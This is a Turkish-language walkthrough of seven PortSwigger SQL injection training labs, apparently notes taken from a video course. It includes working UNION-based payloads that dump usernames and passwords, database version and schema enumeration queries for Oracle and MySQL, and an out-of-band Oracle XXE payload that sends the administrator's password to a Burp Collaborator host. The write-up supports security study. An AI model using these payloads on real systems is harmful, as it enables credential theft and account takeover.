<h1 align="center">SQL Injection Lab Çözümleri</h1>



# Alıştırma #1

* https://portswigger.net/web-security/sql-injection/cheat-sheet sqli için cheatsheet.

* Sözlük
  * table(table): html'de verileri kolonlar ve diziler halinde organize etmeyi sağlayan bir yol. Bir çeşit tablo olarak düşünebiliriz.

* https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables alıştırma adresine gelelim.

* Ürün kategori filtresinde SQL zaafiyeti olduğunu söylüyor. Yapılacak sorguların uygulama tarafından response vereceğini söylüyor dolayısıyla UNION attack yapabilir ve table'lardan veri çekebiliriz.

* Veritabanında **'users'** isimli bir tableın bulunduğunu ve bu tableın içerisinde **username** ve **password** isimli kolonlar barındırdığını söylüyor.

* Bize bu kullanıcı verilerini çekmeye çalışacağız ve **administrator** isimli kullanıcının hesabına girmeye çalışacağız.

* Access the lab dedikten sonra herhangi bir kategoriye gelelim;

![alt text](<WebSec101 0x0A_ss/image.png>)

* SQL'i tespit etmek için yaptığımız trick(numara)'i kullanalım.;

![alt text](<WebSec101 0x0A_ss/image-1.png>)

* Accessories'in hemen yanına bir tırnak koyduk ve;

![alt text](<WebSec101 0x0A_ss/image-2.png>)

* Server error verdi. Bir tane daha tırnak koyalım;

![alt text](<WebSec101 0x0A_ss/image-3.png>)

* SQL injection'ın olduğuna emin olduk böylece;

![alt text](<WebSec101 0x0A_ss/image-4.png>)

* Çünkü iki tırnak koyduğumuzda yazdığımız şeyi okudu ve bize response olarak geri verdi. Eğer bu açığı kullanarak oraya sql kodları da yazarsak yine bize sunucudan veri geleceği yorumunu yapabiliriz. 

* Öncelikle çalıştığımız ekran daha temiz olsun. Accessories kısmının önüne can yazalım ki diğer veriler gözükmesin(siz başka bir şey de yazabilirsiniz önemli olan boş ekran gözükmesi ve veritabanında herhangi bir şey ile eşleşmemesi);

![alt text](<WebSec101 0x0A_ss/image-5.png>)

* sonra Accesories' UNION SELECT null,null-- yazıp aratalım;

![alt text](<WebSec101 0x0A_ss/image-6.png>)

![alt text](<WebSec101 0x0A_ss/image-7.png>)

* **UNION SELECT** bir sql kodu idi ve toplu olarak veri seçmeye yarıyordu. Sonrasında gelen **null** keywordleri ise aslında kolon sayılarını temsil ediyor. null keywordü burada geçici bir test değeridir ve kolon sayılarını bilmememizden  biz iki tane null yazdık ve iki kolon arattık ve aramaya uygulamadan response geldi. Dolayısıyla doğru kolon sayısı 2 imiş. Sonrasında ise **'--'** karakterleri var. Bunlar ise sql kodunu çalıştırabilmemiz için **comment(yorum)** methodudur. Yaptığı şey **--** işaretinden sonrasını yok saymaktır. Bu sayede -- işaretinden önceki kod çalışır sonraki kod çalışmaz. Örn;

    ```sql
    SELECT * FROM users WHERE username = 'admin' AND password = '1234';
    ```

   * Yukarıda kullanıcı adını bildiğimizi ama şifreyi bilmediğimizi düşünelim.

    ```sql
    SELECT * FROM users WHERE username = 'admin' -- AND password = '1234';
    ```

   * Şimdi yaptığımız şifre kısmını yorum satırı olarak kullanmak oldu. Dolayısıyla kullanıcı adını bildiğimiz bir durumda web uygulaması bize şifreyi sormayacak ve direkt giriş yapacağız.


* Kodumuzu **Accesories' UNION SELECT username,password FROM users--**  diyerek güncelleyelim. Hatırlarsak **users** isimli bir table'dan bahsedilmişti ve kolon isimleri de **username** ve **password** olarak verilmişti. Yani onları da geçici değer olan **null**'un yerine yazıyoruz ve aratıyoruz; 

![alt text](<WebSec101 0x0A_ss/image-8.png>)

* Kullanıcı verileri elimizde artık. Administrator adlı kullanıcının parolasını kopyalayıp onun hesabına giriş yapıyoruz; 

![alt text](<WebSec101 0x0A_ss/image-9.png>)

![alt text](<WebSec101 0x0A_ss/image-10.png>)

* Böylece alıştırmayı çözmüş olduk.

# Alıştırma #2

* https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column bu adrese gelelim.

* Alıştırma yine aynı ancak bu sefer görebileceğimiz veriler sadece 1 kolonda gösteriliyor.

* Herhangi bir kategoriye gelip url kısmında kategori isminin yanına iki tane tırnak koyuyoruz ve SQLi tespitini yapıyoruz;

![alt text](<WebSec101 0x0A_ss/image-11.png>)

* Sonra yine geçen alıştırmadaki kodu doğrudan girip aratalım: **Pets' UNION SELECT null,null FROM users--**

![alt text](<WebSec101 0x0A_ss/image-12.png>)

* Kategori isminden önce birşeyler yazalım ki ekran temiz olsun: **canPets' UNION SELECT null,null FROM users--**

![alt text](<WebSec101 0x0A_ss/image-13.png>)

* Şimdi alıştırmada bize yalnızca tek kolonda verilerin olduğu söylenmişti. Biz iki kolon değeri girdik. Şimdi onlardan birine username yazalım ve aratalım: **canPets' UNION SELECT username,null FROM users--**

![alt text](<WebSec101 0x0A_ss/image-14.png>)

* Hata verdi, demek ki ilk kolonda yokmuş, şimdi ilki yerine ikinci kolona yazalım: **canPets' UNION SELECT null,username FROM users--**

![alt text](<WebSec101 0x0A_ss/image-15.png>)

* Evet şimdi veriler gözükmeye başladı. Ancak biz hem username hem de password verilerini görmek istiyoruz. Bu durumda, **canPets' UNION SELECT null,CONCAT(username,'::CAN:: ',password) FROM users--** şimdi ikinci kolon yerine CONCAT fonksiyonu yazıyoruz. Bu fonksiyon da yazılan iki kolon birleştiriliyor. Dolayısıyla **username** ve **password**  yazarsak iki veriyi de görebileceğiz. Ortada da bir string var('::CAN:: ') onu şov yapmak için koyduk herhangi bir işlevi yok.

![alt text](<WebSec101 0x0A_ss/image-18.png>)

* Görüldüğü üzere isim ve şifre bilgileri geldi. Şimdi administor'ın şifresini kopyalayalım ve giriş yapalım;

![alt text](<WebSec101 0x0A_ss/image-19.png>)

![alt text](<WebSec101 0x0A_ss/image-20.png>)

* Bu alıştırma da tamamlandı.


# Alıştırma #3 

* https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle bu alıştırmadan devam ediyoruz. 

* Bizden sqli kullanarak veritabanı versiyon verisini çıkartmamızı istiyor.

* Yine aynı şekilde bir kategoriye gelelim ve **Oracle** veritabanından veri çekme işlemine bakalım. Ama bundan önce çift tırnak koyarak sqli olduğunu doğrulayalım;

![alt text](<WebSec101 0x0A_ss/image-21.png>)

![alt text](<WebSec101 0x0A_ss/image-22.png>)

* Evet sqli var. Şimdi Oracle veritabanından veri çekme işleminin nasıl yapıldığına sayfanın başında verdiğim linkten bakalım ve verileri o şekilde çekelim;

![alt text](<WebSec101 0x0A_ss/image-23.png>)

* Evet **SELECT banner FROM v$version** şeklinde kodumuza ekleme yapalım;

* **canPets' UNION SELECT null,banner FROM v$version--** kodumuzu bu şekilde güncelledik. Burada **banner** keywordünü ikinci **null**'un yerine yazdık çünkü hatırlarsak oradaki kolonda veri gözüküyordu. Sonra da FROM version yani diyerek versiyonu kontrol etmek için kodu yazdık. Şimdi bu kodu kullanalım;

![alt text](<WebSec101 0x0A_ss/image-24.png>)

* Versiyon bilgisi geldi ve alıştırmayı çözdük.

# Alıştırma #4

* https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft bu alıştırmaya gelelim.

* Benzer bir alıştırma bu sefer **MySQL** ya da **Microsoft** databaselerini kullanıyor. 

* Yine bir kategori seçelim ve sqli kontrolü yapalım;

![alt text](<WebSec101 0x0A_ss/image-25.png>)

* Evet sqli var. Şimdi versiyon kontrolü için cheatsheet'i kontrol edelim;

![alt text](<WebSec101 0x0A_ss/image-26.png>)

* Microsofttaki ve mysql'deki versiyon kontrol yöntemi aynı.

* **canPets' UNION SELECT null,banner FROM v$version--** bir önceki kodumuz buydu. Şimdi bunu biraz değiştirelim;

* **canPets' UNION SELECT null,null%23--** yazıyoruz; 

![alt text](<WebSec101 0x0A_ss/image-27.png>)

* Evet bu şekilde yazdığımızda response geldi. Bunun sebebi bizim **mysql** ve **microsoft** tipi database'de sorgu yapıyor oluşumuz. Bu yüzden uygulamadan response alabilmemiz için her database sorgusunda ufak farklılıklar oluyor. Buradaki **%23** işareti de **#** karakterine karşılık geliyor görüldüğü üzere.

* Şimdi bura da çalıştığına göre 	***SELECT @@version*** kısmını ekleme vakti:  **canPets' UNION SELECT null,@@version%23--**, yine ikinci null değerinin yerine yazdık çünkü o kolondaki veriler geliyordu hatırlarsak;

![alt text](<WebSec101 0x0A_ss/image-28.png>)

![alt text](<WebSec101 0x0A_ss/image-29.png>)

* Veri geldi ve alıştırma çözüldü.


# Alıştırma 5

* https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle bu alıştırmaya gelelim.

* Veritabanında kullanıcı adı ve şifreleri tutan bir tablo varmış. Bu tablonun ismini bulmamız lazım. Sonra bu tablonun içeriğine ulaşmamız lazım ki kullanıcı adı ve şifrelere ulaşabilelim;

![alt text](<WebSec101 0x0A_ss/image-30.png>)

* Access the lab dedik ve yine bir kategori seçtik.

![alt text](<WebSec101 0x0A_ss/image-31.png>)

* Sqli varlığını doğruladık(**canPets''** yazdım kategoriden sonra ve arattım.).

![alt text](<WebSec101 0x0A_ss/image-32.png>)

* **UNION SELECT null,null--** kodunu da ekledik ve reponse aldık. 2 tane kolon varmış ondan emin olduk.

* Şimdi bizim veritabanındaki tablolara ulaşmamız lazım. Aradığımız tablo kullanıcı bilgilerini içeriyor bir tek bunu biliyoruz;

![alt text](<WebSec101 0x0A_ss/image-33.png>)

* Cheatsheet'de **SELECT * FROM information_schema.tables** şeklinde bir kod verilmiş. Bunu bizim koda uygulamamız lazım;

* **UNION SELECT null,null FROM information_schema.tables--** şeklinde ekleme yapıyoruz;

![alt text](<WebSec101 0x0A_ss/image-34.png>)

* Şimdi yine ikinci null yerine bir değişiklik yapacağız ki o kolonda istediğimiz tablo isimleri gözüksün. null yerine **table_name** yazıp bir denemede bulunduk:  **UNION SELECT null,table_name FROM information_schema.tables--**

![alt text](<WebSec101 0x0A_ss/image-35.png>)

* Tablo verileri geldi ancak burada biraz fazla veri var. Biraz daha daraltmak için kodda değişiklik yapıyoruz: **UNION SELECT null,table_name FROM information_schema.tables WHERE table_schema = current_schema()--** Burada **WHERE table_schema = current_schema()** kısmını ekledik. Burada aslında **'veritabanında şu anda kullanılan tabloları listele'** diyerek, (yani bu durumda kullanıcı bilgileri şu anda kullanılıyor) gelen verileri daraltıp istediğimize daha kolay ulaşıyoruz; 

![alt text](<WebSec101 0x0A_ss/image-36.png>)

* **users** ile başlayan bir tablo varmış bu ismi kopyalayalım. 

* Şimdi yapmamız gereken bu tablonun içeriğine ulaşmak. Kodumuzu şu şekil yapıyoruz: **UNION SELECT null,column_name FROM information_schema.columns WHERE table_name = 'users_qozkbo'--** burada '**tablo isminin users_qozkbo olduğu yerdeki kolon isimlerini seç'** demiş oluyoruz aslında; 

![alt text](<WebSec101 0x0A_ss/image-37.png>)

* Buradaki verileri de kopyalayalım. 

* Şimdi yapmamız gereken kolon isimleri altındaki verilere ulaşmak. Bunları da birleştirmemiz gerekiyor çünkü tek kolonda veri görebiliyoruz: **UNION SELECT null,CONCAT(username_gloeol,':::CAN:::',password_tkqewr) FROM users_qozkbo--** burada **' users_qozkbo tablosundaki username_gloeol ve password_tkqewr isimli kolonları birleştir ve seç'** demiş oluyoruz; 

![alt text](<WebSec101 0x0A_ss/image-38.png>)

* Evet veriler geldi. Bizden adminin hesabına girmemiz isteniyordu. Administrator'un şifresini kopyalayalım ve giriş yapalım;

![alt text](<WebSec101 0x0A_ss/image-39.png>)

![alt text](<WebSec101 0x0A_ss/image-40.png>)

* Bu alıştırmayı da çözmüş olduk.

# Alıştırma #6

* https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle bu adrese gelelim.

* Bir önceki alıştırmanın aynısı tek fark Oracle ile çözmemizi istiyor. 

* Access the lab dedikten sonra bir kategori seçelim ve; **category=** yazan yerin yanına, **can' UNION SELECT null,table_name FROM all_tables--** yazalım. Oracle'daki fark **FROM all_tables** kodunu eklememiz oldu. Cheatsheet'de yazıyor zaten;

![alt text](<WebSec101 0x0A_ss/image-41.png>)

* Veriler geldi, şimdi yine kullanıcı bilgileri olanı bulalım. Bu sefer F3'e basıp **user** yazalım;

![alt text](<WebSec101 0x0A_ss/image-42.png>)

* En aşağıdaki doğru gözüküyor. Onu kopyalayalım. 

* Şimdi bu tablodan kolonları getirtmemiz lazım. **can' UNION SELECT null,column_name FROM all_tab_columns WHERE table_name = 'USERS_ADHAZW'--** yazıyoruz. **'USERS_ADHAZW isimli tablodaki kolonları seç'** demiş olduk;

![alt text](<WebSec101 0x0A_ss/image-43.png>)

* Kolonlar geldi. Bunları da kopyalayalım. 

* Kodumuzun yeni hali; **can' UNION SELECT null,USERNAME_YJJRKR ||':::CAN:::' || PASSWORD_LCERJX FROM USERS_ADHAZW--** yazıyoruz ve **'USERS_ADHAZW isimli tablodaki USERNAME_YJJRKR ve  PASSWORD_LCERJX kolonlarının içeriğini getir'** demiş oluyoruz. Fark ettiyseniz **concat** oracle'da farklı çalışıyor. Oracle'da birleştirme işlemi '**data' || || 'data'** şeklinde yazılıyor. Cheatsheet'de var bilgisi. 

![alt text](<WebSec101 0x0A_ss/image-44.png>)

* Adminin şifresi ve ismi gözüküyor. Bunlarla giriş yapıp alıştırmayı tamamlayalım;

![alt text](<WebSec101 0x0A_ss/image-45.png>)


# Alıştırma #7

* Sözlük
  * **TrackingId**: Web uygulamaları tarafından kullanılan bir parametredir. Kullanıcı oturumunu, davranışını ve sorgularını izler, takip eder.

* https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band-data-exfiltration bu alıştırmada Burp Pro kullanılması gerektiğinden sadece mantığını anlamaya çalışalım.

* Burada ilk başta siteyle etkileşime geçiliyor ve burpsuite üzerinden sorgu **intercept** edilerek **trackingId** alınıyor;

![alt text](<WebSec101 0x0A_ss/image-46.png>)

* **TrackingId** bir cookiedir ve aynı zamanda **payload'a** dönüştürülebilir. **Tracking ID**'nin **payloada** dönüştürülüp Burpsuite'in bir sunucusuna aktarılması burada temel amaçtır. Böyle bu id içerisindeki kullanıcı bilgilerini dışa aktarabileceğiz;

![alt text](<WebSec101 0x0A_ss/image-47.png>)

* Yukarıda **tracker id** yanına **payload** eklendi gördüğümüz gibi. Burada amaç tracking id'yi kullanarak DNS araması yapmaktır. Yukarıdaki kod; **SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual** budur ve belirtilen adrese dns araması yaptırtmaktadır. Bu kod da cheatsheet de var. Şimdi dns araması burpsuitein sunucusuna yapıldı. Yapılması gereken tek şey bu dns aramasına kullanıcı bilgilerini çekebileceğimiz kodu yazmak;

![alt text](<WebSec101 0x0A_ss/image-48.png>)

* Şeklinde administrator kullanıcısının şifresi sorgulanır ve bununla tekrar dns araması yapılarak burpsuite sunucusuna gönderilir. Yani bu eklenen kod bizim önceki alıştırmalarımızdakine bir hayli benzer;

![alt text](<WebSec101 0x0A_ss/image-49.png>)

* Bu sorgudan sonra sunucuya administrator kullanıcısnın parolası gitmektedir. Böylelikle bu alıştırmada tamamlanmaktadır.

* Yani burpsuite'in sunucusuna tracking id'yi kullanarak sitedeki kullanıcı verilerini yolladık. Burpsuite'in sunucusuna yollanan verileri de yine burpsuite sunucusundan aldık.


# KAYNAK

[Web Security 0x0A | Web Security Academy'den Devam Ediyoruz](https://www.youtube.com/watch?v=ebLgQiG7ACw&list=PLwP4ObPL5GY940XhCtAykxLxLEOKCu0nT&index=10)